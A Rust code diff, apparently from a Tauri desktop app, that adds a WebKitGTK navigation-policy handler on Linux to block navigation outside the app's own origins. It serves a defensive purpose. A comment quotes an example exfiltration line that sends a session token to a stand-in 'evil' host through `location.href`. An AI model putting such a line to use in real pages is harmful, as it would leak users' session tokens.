@@ -240,7 +240,47 @@ pub fn run(options: Options) {
             #[cfg(target_os = "linux")]
             if let Some(window) = tauri::Manager::get_webview_window(tauri_app, "main") {
                 let _ = window.with_webview(|webview| {
-                    use webkit2gtk::WebViewExt;
+                    use webkit2gtk::glib::object::Cast;
+                    use webkit2gtk::{
+                        NavigationPolicyDecisionExt, PolicyDecisionExt, PolicyDecisionType,
+                        URIRequestExt, WebViewExt,
+                    };
+
+                    // The CSP stops the web realm from *fetching* anything
+                    // remote, but no CSP directive governs navigation: a
+                    // `location.href = 'https://evil/?' + token` would still
+                    // leave, carrying the session token in the URL. Refuse any
+                    // navigation outside the app's own origins, so the WebView
+                    // has no route to the internet at all.
+                    webview.inner().connect_decide_policy(|_webview, decision, kind| {
+                        if !matches!(
+                            kind,
+                            PolicyDecisionType::NavigationAction
+                                | PolicyDecisionType::NewWindowAction
+                        ) {
+                            return false; // a response decision: not ours
+                        }
+                        let uri = decision
+                            .clone()
+                            .downcast::<webkit2gtk::NavigationPolicyDecision>()
+                            .ok()
+                            .and_then(|navigation| navigation.navigation_action())
+                            .and_then(|action| action.request())
+                            .and_then(|request| request.uri())
+                            .map(|uri| uri.to_string());
+                        // An unreadable target is refused, like a remote one.
+                        let allowed =
+                            uri.as_deref().map(sandbox::is_local_navigation).unwrap_or(false);
+                        if !allowed {
+                            eprintln!(
+                                "metafolder-gui: blocked a navigation out of the app: {}",
+                                uri.as_deref().unwrap_or("<unreadable>")
+                            );
+                            decision.ignore();
+                            return true; // handled: the navigation is dropped
+                        }
+                        false
+                    });
 
                     // The web process is confined by WEBKIT_FORCE_SANDBOX, set
                     // in `sandbox::preflight`. Not by
